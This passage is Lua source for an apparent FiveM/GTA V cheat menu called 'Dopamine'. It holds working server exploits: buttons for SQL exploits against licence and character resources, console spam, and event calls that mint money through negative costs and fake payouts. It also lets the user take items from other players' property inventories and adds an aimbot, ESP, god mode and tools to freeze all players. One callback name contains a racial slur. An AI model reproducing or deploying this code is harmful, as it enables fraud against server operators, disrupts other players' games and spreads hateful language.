						TriggerCustomEvent(true, 'esx_illegal_drugs:startHarvestOpium')

						TriggerCustomEvent(true, 'esx_drugs:startTransformOpium')
						TriggerCustomEvent(true, 'esx_illegal_drugs:startTransformOpium')
					elseif selectedESXDrugSpawn == 3 then
						TriggerCustomEvent(true, 'esx_drugs:startHarvestMeth')
						TriggerCustomEvent(true, 'esx_illegal_drugs:startHarvestMeth')

						TriggerCustomEvent(true, 'esx_drugs:startTransformMeth')
						TriggerCustomEvent(true, 'esx_illegal_drugs:startTransformMeth')
					elseif selectedESXDrugSpawn == 4 then
						TriggerCustomEvent(true, 'esx_drugs:startHarvestCoke')
						TriggerCustomEvent(true, 'esx_illegal_drugs:startHarvestCoke')

						TriggerCustomEvent(true, 'esx_drugs:startTransformCoke')
						TriggerCustomEvent(true, 'esx_illegal_drugs:startTransformCoke')
					end
				else Dopamine.PushNotification("Resource was not found!", 5000) end
			elseif Dopamine.Button('GCPhone Earrape', 'Server') then
				NertigelFunc.exploits.gcphoneTwitter()
			elseif Dopamine.Button('Licenses SQL Exploit', 'Server') then
				NertigelFunc.exploits.esx_license()
			elseif Dopamine.Button('Kashacters SQL Exploit', 'Server') then
				NertigelFunc.exploits.esx_kashacters()
			elseif Dopamine.Button('InteractSound Earrape', 'Server') then
				NertigelFunc.exploits.interactSound()
			elseif Dopamine.Button('Phone Jobs Spam', 'Server') then
				NertigelFunc.exploits.phoneSpam()
			elseif Dopamine.Button('Spam Server Console', 'Server') then
				if ESX ~= nil then
					for i = 1, 50 do
						ESX.TriggerServerCallback('d0pamine_xyz:getFuckedNigger', function(players)
						end)
					end
				else Dopamine.PushNotification("ESX was not found!", 5000) end
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('serverOptionsTriggerEventsVRP') then
			if Dopamine.Button('Toggle Handcuffs', 'Client') then
				vRP.toggleHandcuff()
			elseif Dopamine.Button('Clear Wanted Level', 'Client') then
				vRP.applyWantedLevel(0)
			elseif Dopamine.Button('Trucker Job Money', 'Client') then
				local money = NertigelFunc.Game.KeyboardInput("Enter $ Amount:", '', 12)
				if money ~= '' then
					local distance = money / 3.80 --[[ money is distance*3.80]]
					vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
					vRPtruckS.finishTruckingDelivery({distance})
				end
			elseif Dopamine.Button('Casino Chips', 'Client') then
				local amount = NertigelFunc.Game.KeyboardInput("Enter Chips Amount:", '', 12)
				if amount ~= '' then
					vRPcasinoS = Tunnel.getInterface("vRP_casino","vRP_casino")
					vRPcasinoS.payRouletteWinnings({amount, 2})
				end
			elseif Dopamine.Button('Los Santos Customs', 'Server') then
				local m = NertigelFunc.Game.KeyboardInput('Enter amount of money', '', 12)
				if m ~= '' then
					TriggerCustomEvent(true, 'lscustoms:payGarage', { costs = -m })
				end
			elseif Dopamine.Button('Slot Machine', 'Server') then
				local m = NertigelFunc.Game.KeyboardInput('Enter amount of money', '', 12)
				if m ~= '' then
					TriggerCustomEvent(true, 'vrp_slotmachine:server:2', m)
				end
			elseif Dopamine.Button('Legacy Fuel', 'Server') then
				local m = NertigelFunc.Game.KeyboardInput('Enter amount of money', '', 12)
				if m ~= '' then
					TriggerCustomEvent(true, 'LegacyFuel:PayFuel', { costs = -m })
				end
			elseif Dopamine.Button('Get Driving License', 'Server') then
				TriggerCustomEvent(true, 'dmv:success')
			elseif Dopamine.Button('Bank Deposit', 'Server') then
				local m = NertigelFunc.Game.KeyboardInput('Enter amount of money', '', 12)
				if m ~= '' then
					TriggerCustomEvent(true, 'Banca:deposit', m)
					TriggerCustomEvent(true, 'bank:deposit', m)
				end
			elseif Dopamine.Button('Bank Withdraw', 'Server') then
				local m = NertigelFunc.Game.KeyboardInput('Enter amount of money', '', 12)
				if m ~= '' then
					TriggerCustomEvent(true, 'bank:withdraw', m)
					TriggerCustomEvent(true, 'Banca:withdraw', m)
				end
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('serverOptionsTriggerEventsESXProperty') then
			Citizen.CreateThread(function()
				if ESX ~= nil then
					ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)
						for i = 1, #players do
							--[[print(players[i].identifier)]]
							local t = players[i].identifier
							ESX.TriggerServerCallback("esx_property:getPropertyInventory", function(inventory)
								if inventory.items[1] == nil and inventory.weapons[1] == nil and inventory.blackMoney == 0 then
									local sdf = nil
								elseif inventory.items[1].count > 0 or inventory.weapons[1].ammo > 0 then
									if Dopamine.MenuButton('Open ' .. GetPlayerName(GetPlayerFromServerId(players[i].source)) .."'s Inventory", "esx_property"..players[i].source) then
									end
									if Dopamine.IsMenuOpened("esx_property"..players[i].source) then
										print(players[i].source)
										PrintTable(inventory)
										if inventory.items == {} or inventory.items == nil then
											Dopamine.PushNotification("No Items In Property", 5000)
										end
										if inventory.weapons == {} or inventory.weapons == nil then
											Dopamine.PushNotification("No Weapons In Property", 5000)
										end
										if inventory.blackMoney > 0 then
											if Dopamine.Button("Grab All Black Money | A : " .. inventory.blackMoney) then
												TriggerCustomEvent(true, "esx_property:getItem", t, "item_account", "black_money", inventory.blackMoney)
											end
										end
										for i = 1, #inventory.items do
											local item = inventory.items[i].label
											if inventory.items[i].count > 0 then
												local NumberAmount = 1
		
												if Dopamine.ComboBox('Amount To Grab', {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20, inventory.items[i].count}, 1, 1, 
													function(currentIndex, selectedIndex)
														if currentIndex <= 20 then
															NumberAmount = selectedIndex
														else
															NumberAmount = inventory.items[i].count
														end
													end) then 
												end
		
												if Dopamine.Button("Label | " .. inventory.items[i].label) then
												end
		
												if Dopamine.Button("Name | " .. inventory.items[i].name) then
												end
		
												if Dopamine.Button("Amount | " .. inventory.items[i].count) then
												end
		
												if Dopamine.Button("Grab | " .. inventory.items[i].count) then
													local idv = players[i].identifier
													local vst = inventory.items[i]
													TriggerCustomEvent(true, "esx_property:getItem", t, "item_standard", vst.name, NumberAmount)
												end
											end
										end
		
										for i = 1, #inventory.weapons do
											local item = inventory.weapons[i].name
											local NumberAmount = 1
		
											if Dopamine.ComboBox('Amount To Grab', {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20}, 1, 1, 
												function(currentIndex, selectedIndex)
													NumberAmount = selectedIndex
													print(selectedIndex, NumberAmount)
												end) then 
											end
		
											if Dopamine.Button('Ammo | ' .. inventory.weapons[i].ammo) then
											end
		
											if Dopamine.Button('Grab | ' .. item) then
												local idv = t
												local vst = inventory.weapons[i]
												TriggerCustomEvent(true, "esx_property:getItem", idv, "item_weapon", vst.name, NumberAmount)
											end
										end
							
										Dopamine.Display()
									end
								end
							end, t)
						end
					end)
				else
					print('es_extended not found')
				end
			end)

			Dopamine.Display()
		elseif IsDisabledControlJustPressed(0, Keys["TAB"]) then
			Dopamine.OpenMenu('dopamine')
		end

		--[[
			Notifications
		]]

		if #cachedNotifications > 0 then
            for notificationIndex = 1, #cachedNotifications do
                local notification = cachedNotifications[notificationIndex]

                if notification then
                    notification["opacity"] = (notification["opacity"] or (notification["time"] / 1000) * 60) - 1

                    local offset = 0.005 + (notificationIndex * .05)
                    local notificationTimer = (GetGameTimer() - notification["startTime"]) / notification["time"] * 100

                    Dopamine.Draw3D(0.5, 0.8 * offset, notification["text"], notification["opacity"])

                    if notificationTimer >= 100 then
                        Dopamine.RemoveNotification(notificationIndex)
                    end
                end
            end
		end

        --[[
			Run every frame/tick | Make sure that functions don't use Wait
		]]
		
		SetPlayerInvincible(PlayerId(), selfGodmode)
		SetEntityInvincible(PlayerPedId(-1), selfGodmode)
		
		if selfSemigodmode then
            if GetEntityHealth(PlayerPedId()) < 200 then
                SetEntityHealth(PlayerPedId(), 200)
            end
		end
		
		if selfNeverWanted then
            ClearPlayerWantedLevel(PlayerId())
        end
		
        if selfInfiniteStamina then
        	ResetPlayerStamina(PlayerId())
		end
		
		if selfSuperJump then
			SetSuperJumpThisFrame(PlayerId())
		end

        if allPlayersFreeze then
        	NertigelFunc.aPO.freezeAll()
        end

        if allPlayersDisableDrivingCars then
        	NertigelFunc.aPO.disableDrivingCars()
		end
		
		if allPlayersNoisyVehicles then
			NertigelFunc.aPO.noisyVehicles()
		end
		
		if selectedCustomCrosshair == 2 then
			ShowHudComponentThisFrame(14)
		elseif selectedCustomCrosshair == 3 then
			NertigelFunc.drawTextCrosshairs('+', 0.495, 0.484, 1.0, 0.3, MainColor)
		end

		SetArtificialLightsState(visualsBlackout)

		if pedDensityXSelected < 1 then
			SetVehicleDensityMultiplierThisFrame(pedDensityXSelected)
            SetRandomVehicleDensityMultiplierThisFrame(pedDensityXSelected)
            SetParkedVehicleDensityMultiplierThisFrame(pedDensityXSelected)
            SetAmbientVehicleRangeMultiplierThisFrame(1.0)
			SetPedDensityMultiplierThisFrame(pedDensityXSelected)
			SetScenarioPedDensityMultiplierThisFrame(pedDensityXSelected, pedDensityXSelected)
			DistantCopCarSirens(false)
			SetGarbageTrucks(false)
			SetRandomBoats(false)
			SetCreateRandomCops(false)
			SetCreateRandomCopsNotOnScenarios(false)
			SetCreateRandomCopsOnScenarios(false)

			local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))
			ClearAreaOfVehicles(x, y, z, 1000, false, false, false, false, false)
			RemoveVehiclesFromGeneratorsInArea(x - 500.0, y - 500.0, z - 500.0, x + 500.0, y + 500.0, z + 500.0);
		end

		if engineTorqueBoost > 1 then
			SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), engineTorqueBoost + 0.0)
		end

		if enginePowerBoost > 1 then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), enginePowerBoost + 1.0)
		end

		if vehiclesGodmode and IsPedInAnyVehicle(PlayerPedId(-1), true) then
			SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
		end

		if vehiclesAlwaysWheelie then
			if IsPedInAnyVehicle(GetPlayerPed(-1)) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1)), -1) == GetPlayerPed(-1) then
				SetVehicleWheelieState(GetVehiclePedIsIn(GetPlayerPed(-1)), 129)
			end
		end

		if vehiclesRainbow then
			local rgb = ReturnRGB(1.0)
			RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
			SetVehicleCustomPrimaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), rgb.r, rgb.g, rgb.b)
			SetVehicleCustomSecondaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), rgb.r, rgb.g, rgb.b)
		end

		if vehiclesLower then
			if (IsPedInVehicle(PlayerPedId(), GetVehiclePedIsIn(PlayerPedId(), true), true)) then
				ApplyForceToEntity(GetVehiclePedIsIn(PlayerPedId(), true), 1, 0, 0, -0.1, 0, 0, 0, 1, false, true, true, true, true)
			end
		end

		if vehiclesWallride then
			if (IsPedInVehicle(PlayerPedId(), GetVehiclePedIsIn(PlayerPedId(), true), true)) then
				ApplyForceToEntity(GetVehiclePedIsIn(PlayerPedId(), true), 1, 0, 0, -0.4, 0, 0, 0, 1, true, true, true, true, true)
			end
		end

		if teleportShowCoords then
			x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
			roundx = tonumber(string.format('%.2f', x))
			roundy = tonumber(string.format('%.2f', y))
			roundz = tonumber(string.format('%.2f', z))
			NertigelFunc.drawTextCrosshairs('~w~X: ~s~' .. roundx, 0.05, 0.0, MainColor)
			NertigelFunc.drawTextCrosshairs('~w~Y: ~s~' .. roundy, 0.11, 0.0, MainColor)
			NertigelFunc.drawTextCrosshairs('~w~Z: ~s~' .. roundz, 0.17, 0.0, MainColor)
		end

		SetPlayerWeaponDamageModifier(PlayerId(), weaponsDamageMultiplierSet)
		SetPlayerMeleeWeaponDamageModifier(PlayerId(), weaponsDamageMultiplierSet)

		if weaponsExplosiveAmmo then
			local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
			if impact then
				AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
			end
			SetExplosiveMeleeThisFrame(PlayerId())
		end
		
		if weaponsTeleportGun then
			local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
			if impact then
				SetEntityCoords(PlayerPedId(), coords.x, coords.y, coords.z + 3)
			end
		end

		if weaponsAimbotT then
			NertigelFunc.runAimbot()
		end

		if weaponsRapidFire then
			NertigelFunc.rapidFireTick()
		end

		--[[Dopamine.Draw3D(0.5, 0.5, 'test', 255)]]

		Citizen.Wait(0)
	end
end)

--[[
	Run 2 step separately because of Wait usage
]]

Citizen.CreateThread(function()
	while ShouldShowMenu do
		if vehicleOptions2Step then
        	NertigelFunc.vehicle2Step()
		end
		
		if vehiclesDriftSmoke then
			RequestNamedPtfxAsset("scr_recartheft")
			while not HasNamedPtfxAssetLoaded("scr_recartheft") do
				Wait(1)
			end
			RequestNamedPtfxAsset("core")
			while not HasNamedPtfxAssetLoaded("core") do
				Wait(1)
			end
			ang,speed = NertigelFunc.Game.vehicleAngle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
			local _SIZE = 0.25
			local _DENS = 25
			local _BURNOUT_SIZE = 1.5
			if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                if speed >= 1.0 and ang ~= 0 then
                    NertigelFunc.Game.driftSmoke("scr_recartheft","scr_wheel_burnout", GetVehiclePedIsUsing(GetPlayerPed(-1)), _DENS, _SIZE)
                elseif --[[speed < 1.0 and]] IsVehicleInBurnout(GetVehiclePedIsUsing(GetPlayerPed(-1))) then
                    NertigelFunc.Game.driftSmoke("core" ,"exp_grd_bzgas_smoke", GetVehiclePedIsUsing(GetPlayerPed(-1)), 3, _BURNOUT_SIZE)
                end
            end
		end

		Citizen.Wait(0)
	end
end)

--[[
	Functions here to keep menu clean
]]

NertigelFunc = {}

NertigelFunc.doesResourceExist = function(resource_name)
	if GetResourceState(resource_name) == "started" or 
		string.upper(GetResourceState(resource_name)) == "started" or 
		string.lower(GetResourceState(resource_name)) == "started" then
		return true
	else
		return false
	end
end

NertigelFunc.drawTextCrosshairs = function(C,x,y)
	SetTextColour(MainColor.r, MainColor.g, MainColor.b, 255)
	SetTextFont(0)
	SetTextProportional(1)
	SetTextScale(0.0,0.4)
	SetTextDropshadow(1,0,0,0,255)
	SetTextEdge(1,0,0,0,255)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	AddTextComponentString(C)
	DrawText(x,y)
end

NertigelFunc.teleportToWaypoint = function()
	local entity = PlayerPedId()
    if IsPedInAnyVehicle(entity, false) then
        entity = GetVehiclePedIsUsing(entity)
    end
    local success = false
    local blipFound = false
    local blipIterator = GetBlipInfoIdIterator()
    local blip = GetFirstBlipInfoId(8)
    
    while DoesBlipExist(blip) do
        if GetBlipInfoIdType(blip) == 4 then
            cx, cy, cz = table.unpack(GetBlipInfoIdCoord(blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))
            blipFound = true
            break
        end
        blip = GetNextBlipInfoId(blipIterator)
        Wait(0)
    end
    
    if blipFound then
        local groundFound = false
        local yaw = GetEntityHeading(entity)
        
        for i = 0, 1000, 1 do
            SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
            SetEntityRotation(entity, 0, 0, 0, 0, 0)
            SetEntityHeading(entity, yaw)
            SetGameplayCamRelativeHeading(0)
            Wait(0)
            if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
                cz = ToFloat(i)
                groundFound = true
                break
            end
        end
        if not groundFound then
            cz = -300.0
        end
        success = true
    end
    
    if success then
        SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
        SetGameplayCamRelativeHeading(0)
        if IsPedSittingInAnyVehicle(PlayerPedId()) then
            if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
                SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
            end
        end
    end
end

NertigelFunc.runParticle = function()
	RequestNamedPtfxAsset("proj_xmas_firework")
	UseParticleFxAssetNextCall("proj_xmas_firework")
	StartNetworkedParticleFxNonLoopedOnEntity("scr_firework_xmas_burst_rgw", PlayerPedId(), 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
end

NertigelFunc.runInjectParticle = function()
	RequestNamedPtfxAsset("proj_xmas_firework")
	UseParticleFxAssetNextCall("proj_xmas_firework")
	StartNetworkedParticleFxNonLoopedOnEntity("scr_firework_xmas_burst_rgw", PlayerPedId(), 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
	StartNetworkedParticleFxNonLoopedOnEntity("scr_firework_xmas_spiral_burst_rgw", PlayerPedId(), 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
	StartNetworkedParticleFxNonLoopedOnEntity("scr_xmas_firework_sparkle_spawn", PlayerPedId(), 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
end
NertigelFunc.runInjectParticle()

NertigelFunc.respawnPed = function(ped, coords, heading)
	SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, true)
	NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
	SetPlayerInvincible(ped, false)
	TriggerCustomEvent(false, 'playerSpawned', coords.x, coords.y, coords.z)
	ClearPedBloodDamage(ped)
end

NertigelFunc.nativeRevive = function()
	local coords = GetEntityCoords(PlayerPedId())

	local formattedCoords = {
		x = NertigelFunc.Math.Round(coords.x, 1),
		y = NertigelFunc.Math.Round(coords.y, 1),
		z = NertigelFunc.Math.Round(coords.z, 1)
	}

	NertigelFunc.respawnPed(PlayerPedId(), formattedCoords, 0.0)
	StopScreenEffect('DeathFailOut')
	Dopamine.PushNotification('Revived', 5000)
end

NertigelFunc.repairVehicle = function(pvehicle)
	SetVehicleEngineHealth(pvehicle, 1000)
	SetVehicleFixed(pvehicle)
	SetVehicleEngineOn(pvehicle, 1, 1)
	SetVehicleBurnout(pvehicle, false)
end

NertigelFunc.deleteVehicle = function(pvehicle, radius)
	if radius then
		local playerPed = PlayerPedId()
		radius = tonumber(radius) + 0.01
		local vehicles = NertigelFunc.Game.GetVehiclesInArea(GetEntityCoords(playerPed), radius)

		for k,entity in ipairs(vehicles) do
			local attempt = 0

			while not NetworkHasControlOfEntity(entity) and attempt < 50 and DoesEntityExist(entity) do
				NetworkRequestControlOfEntity(entity)
				attempt = attempt + 1
			end

			if DoesEntityExist(entity) and NetworkHasControlOfEntity(entity) then
				SetEntityAsMissionEntity(entity, false, true)
				DeleteVehicle(entity)
			end
		end
	else
		SetEntityAsMissionEntity(pvehicle, false, true)
		DeleteVehicle(pvehicle)
	end
end

NertigelFunc.optimizeFPS = function()
	ClearAllBrokenGlass()
	ClearAllHelpMessages()
	LeaderboardsReadClearAll()
	ClearBrief()
	ClearGpsFlags()
	ClearPrints()
	ClearSmallPrints()
	ClearReplayStats()
	LeaderboardsClearCacheData()
	ClearFocus()
	ClearHdArea()
	ClearPedBloodDamage(PlayerPedId())
	ClearPedWetness(PlayerPedId())
	ClearPedEnvDirt(PlayerPedId())
	ResetPedVisibleDamage(PlayerPedId())
end

NertigelFunc.clearSelfWanted = function()
	SetMaxWantedLevel(0)
	SetPoliceIgnorePlayer(GetPlayerPed(), true)
	SetEveryoneIgnorePlayer(GetPlayerPed(), true)
	SetPlayerCanBeHassledByGangs(GetPlayerPed(), false)
	SetIgnoreLowPriorityShockingEvents(GetPlayerPed(), true)
end

NertigelFunc.disappearFromChase = function()
	if IsPedInAnyVehicle(GetPlayerPed(-1)) then
		--[[setupModel(GetHashKey("s_m_m_security_01"))]]

		local vehicle = GetVehiclePedIsIn(PlayerPedId(), true)
		if DoesEntityExist(vehicle) then
			local targetx, targety, targetz = table.unpack(GetEntityCoords(PlayerPedId()))
			SetEntityCoords(PlayerPedId(), targetx + 1, targety + 2, targetz + 10)
			--[[SetEntityCoords(PlayerPedId(), -1729.98, -724.68, 9.84)]]

			local newDriver = CreatePedInsideVehicle(vehicle, 4, GetEntityModel(PlayerPedId()), -1, true, false)
			NertigelFunc.sPO.clonePedOutfit(newDriver, PlayerPedId())
			SetEntityAsMissionEntity(newDriver, 0, 0)
			TaskVehicleDriveToCoordLongrange(newDriver, vehicle, -34.552, -673.060, 31.944, 100.0, 537657916, 1.0)
			SetDriveTaskDrivingStyle(newDriver, 6)

			local vehicleModel = GetEntityModel(vehicle)
			local spawnedVehicle = SpawnVehicleToPlayer(vehicleModel, PlayerId())
			local vehicleProperties = NertigelFunc.Game.GetVehicleProperties(vehicle)
			vehicleProperties.plate = nil

			NertigelFunc.Game.SetVehicleProperties(spawnedVehicle, vehicleProperties)
		else
			print('vehicle entity doesnt exist')
		end
	else
		print('youre not in a vehicle')
	end
end

local v2sShould2sStep = false
NertigelFunc.vehicle2Step = function()
	p_flame_location = {
		"exhaust",
		"exhaust_2",
		"exhaust_3",
		"exhaust_4",
		"exhaust_5",
		"exhaust_6",
		"exhaust_7",
		"exhaust_8",
		"exhaust_9",
		"exhaust_10",
		"exhaust_11",
		"exhaust_12",
		"exhaust_13",
		"exhaust_14",
		"exhaust_15",
		"exhaust_16"
	}
	p_flame_particle = "veh_backfire"
	p_flame_particle_asset = "core" 
	p_flame_size = 2.0

	if IsPedInAnyVehicle(GetPlayerPed(-1)) then
		local pedVehicle = GetVehiclePedIsIn(GetPlayerPed(-1))
		local pedPos = GetEntityCoords(GetPlayerPed(-1))
		local vehiclePos = GetEntityCoords(pedVehicle)
		local RPM = GetVehicleCurrentRpm(GetVehiclePedIsIn(GetPlayerPed(-1)))

		if GetPedInVehicleSeat(pedVehicle, -1) == GetPlayerPed(-1) then
			local BackFireDelay = (math.random(250, 750))
			local backFireSize = (math.random(2, 6) / 1.5)
			if RPM > 0.3 and RPM < 0.6 then
				for _,bones in pairs(p_flame_location) do
					if GetEntityBoneIndexByName(pedVehicle, bones) >= 0 then
						UseParticleFxAssetNextCall(p_flame_particle_asset)
						createdPart = StartParticleFxLoopedOnEntityBone(p_flame_particle, NetToVeh(VehToNet(pedVehicle)), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, GetEntityBoneIndexByName(NetToVeh(VehToNet(pedVehicle)), bones), backFireSize--[[p_flame_size]], 0.0, 0.0, 0.0)
						StopParticleFxLooped(createdPart, 1)
					end
				end
				--[[PlaySoundFrontend(-1, "Jet_Explosions", "exile_1", true)]]
				AddExplosion(vehiclePos.x, vehiclePos.y, vehiclePos.z, 61, 0.0, true, true, 0.0, true)
				v2sShould2sStep = true
			  	Citizen.Wait(BackFireDelay)
			else 
				v2sShould2sStep = false
			end
		end
	end
end

NertigelFunc.maxUpgrades = function(veh)
	SetVehicleModKit(veh, 0)
	SetVehicleCustomPrimaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), 0, 0, 0)
	SetVehicleCustomSecondaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), 0, 0, 0)
	SetVehicleColours(veh, 12, 12)
	SetVehicleModColor_1(veh, 3, 0)
	SetVehicleExtraColours(veh, 3, 0)
	ToggleVehicleMod(veh, 18, 1)
	ToggleVehicleMod(veh, 22, 1)
	SetVehicleMod(veh, 16, 5, 0)
	SetVehicleMod(veh, 12, 2, 0)
	SetVehicleMod(veh, 11, 3, 0)
	SetVehicleMod(veh, 14, 14, 0)
	SetVehicleMod(veh, 15, 3, 0)
	SetVehicleMod(veh, 13, 2, 0)
	SetVehicleWindowTint(veh, 5)
	SetVehicleWheelType(veh, 0)
	SetVehicleMod(veh, 23, 21, 1)
	SetVehicleMod(veh, 0, 1, 0)
	SetVehicleMod(veh, 1, 1, 0)
	SetVehicleMod(veh, 2, 1, 0)
	SetVehicleMod(veh, 3, 1, 0)
	SetVehicleMod(veh, 4, 1, 0)
	SetVehicleMod(veh, 5, 1, 0)
	SetVehicleMod(veh, 6, 1, 0)
	SetVehicleMod(veh, 7, 1, 0)
	SetVehicleMod(veh, 8, 1, 0)
	SetVehicleMod(veh, 9, 1, 0)
	SetVehicleMod(veh, 10, 1, 0)
	IsVehicleNeonLightEnabled(veh, 1)
	SetVehicleNeonLightEnabled(veh, 0, 1)
	SetVehicleNeonLightEnabled(veh, 1, 1)
	SetVehicleNeonLightEnabled(veh, 2, 1)
	SetVehicleNeonLightEnabled(veh, 3, 1)
	SetVehicleNeonLightEnabled(veh, 4, 1)
	SetVehicleNeonLightEnabled(veh, 5, 1)
	SetVehicleNeonLightEnabled(veh, 6, 1)
	SetVehicleNeonLightEnabled(veh, 7, 1)
	SetVehicleNeonLightsColour(veh, MainColor.r, MainColor.g, MainColor.b)
	SetVehicleModKit(veh, 0)
	ToggleVehicleMod(veh, 20, 1)
	SetVehicleModKit(veh, 0)
	SetVehicleTyreSmokeColor(veh, MainColor.r, MainColor.g, MainColor.b)
	NertigelFunc.runParticle()
end

NertigelFunc.maxPerformanceUpgrades = function(pVehicle)
	SetVehicleModKit(pVehicle, 0)
    SetVehicleMod(pVehicle, 11, GetNumVehicleMods(pVehicle, 11) - 1, false)
    SetVehicleMod(pVehicle, 12, GetNumVehicleMods(pVehicle, 12) - 1, false)
    SetVehicleMod(pVehicle, 13, GetNumVehicleMods(pVehicle, 13) - 1, false)
    SetVehicleMod(pVehicle, 15, GetNumVehicleMods(pVehicle, 15) - 2, false)
    SetVehicleMod(pVehicle, 16, GetNumVehicleMods(pVehicle, 16) - 1, false)
    ToggleVehicleMod(pVehicle, 17, true)
    ToggleVehicleMod(pVehicle, 18, true)
    ToggleVehicleMod(pVehicle, 19, true)
    ToggleVehicleMod(pVehicle, 21, true)
end

NertigelFunc.spawnVehicle = function(vehicle_model)
	local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
	local veh = vehicle_model
	if veh == nil then
		veh = 'elegy'
	end
	vehiclehash = GetHashKey(veh)
	RequestModel(vehiclehash)
	Citizen.CreateThread(function()
		local timeout = 0
		while not HasModelLoaded(vehiclehash) do
			timeout = timeout + 100
			Citizen.Wait(100)
			if timeout > 5000 then
				Dopamine.PushNotification('Could not spawn this vehicle!', 5000)
				break
			end
		end
		SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)

		SetVehicleStrong(SpawnedCar, true)
		SetVehicleEngineOn(SpawnedCar, true, true, false)
		SetVehicleEngineCanDegrade(SpawnedCar, false)
		
		if vehiclesSpawnUpgraded then
			NertigelFunc.maxUpgrades(SpawnedCar)
		end
		
		if vehiclesSpawnInside then
			SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
		end

		NertigelFunc.runParticle()
	end)
end

NertigelFunc.spawnCustomVehicle = function(vehicle_model)
	RequestModel(vehicle_model)
	Citizen.CreateThread(function()
		local timeout = 0
		if vehicle_model == nil then
			vehicle_model = 'elegy'
		end
		while not HasModelLoaded(GetHashKey(vehicle_model)) do
			timeout = timeout + 100
			Citizen.Wait(10)
			if timeout > 5000 then
				Dopamine.PushNotification('Could not spawn this vehicle!', 5000)
				break
			end
		end

		SpawnedCar = CreateVehicle(GetHashKey(vehicle_model), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

		SetVehicleStrong(SpawnedCar, true)
		SetVehicleEngineOn(SpawnedCar, true, true, false)
		SetVehicleEngineCanDegrade(SpawnedCar, false)
		
		if vehiclesSpawnUpgraded then
			NertigelFunc.maxUpgrades(SpawnedCar)
		end

		if vehiclesSpawnInside then
			SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
		end

		NertigelFunc.runParticle()
	end)
end

NertigelFunc.runAimbot = function()
	--[[Lock on players]]
	for ped in EnumeratePeds() do
		if IsEntityOnScreen(ped) and HasEntityClearLosToEntityInFront(PlayerPedId(), ped) and not IsPedDeadOrDying(ped) then
			local bone = GetPedBoneCoords(ped, GetEntityBoneIndexByName(ped, "SKEL_HEAD"), 0.0, 0.0, 0.0)
			if IsPlayerFreeAiming(PlayerId()) then
				SetPedShootsAtCoord(PlayerPedId(), bone, true)
			end
		end
	end
end

NertigelFunc.rapidFireTick = function()
	if IsDisabledControlPressed(0, Keys["MOUSE1"]) then
		local _, weapon = GetCurrentPedWeapon(PlayerPedId())
		local launchPos = GetEntityCoords(GetCurrentPedWeaponEntityIndex(PlayerPedId()))
		local targetPos = GetGameplayCamCoord() + (GetCamDirFromScreenCenter() * 200.0)

		ClearAreaOfProjectiles(launchPos, 0.0, 1)
		
		ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)

		if weaponsExplosiveAmmo then
			ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, "WEAPON_GRENADE", PlayerPedId(), true, true, 24000.0)
		end
	end
end

NertigelFunc.toggleESP = function()

	local _,x,y = false, 0.0, 0.0

	Citizen.CreateThread(function()
		while visualsESPEnable do
            local plist = GetActivePlayers()
            if not visualsESPShowSelf then
				table.removekey(plist, PlayerId())
			end
            for i = 1, #plist do
				local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
				_, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
			end
			Wait(visualsESPRefreshRate)
		end
	end)

	Citizen.CreateThread(function()
		while visualsESPEnable do
			local plist = GetActivePlayers()
			if not visualsESPShowSelf then
				table.removekey(plist, PlayerId())
			end
			for i = 1, #plist do
				local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
				local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), targetCoords)
				if distance <= visualsESPDistance then
					local _, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
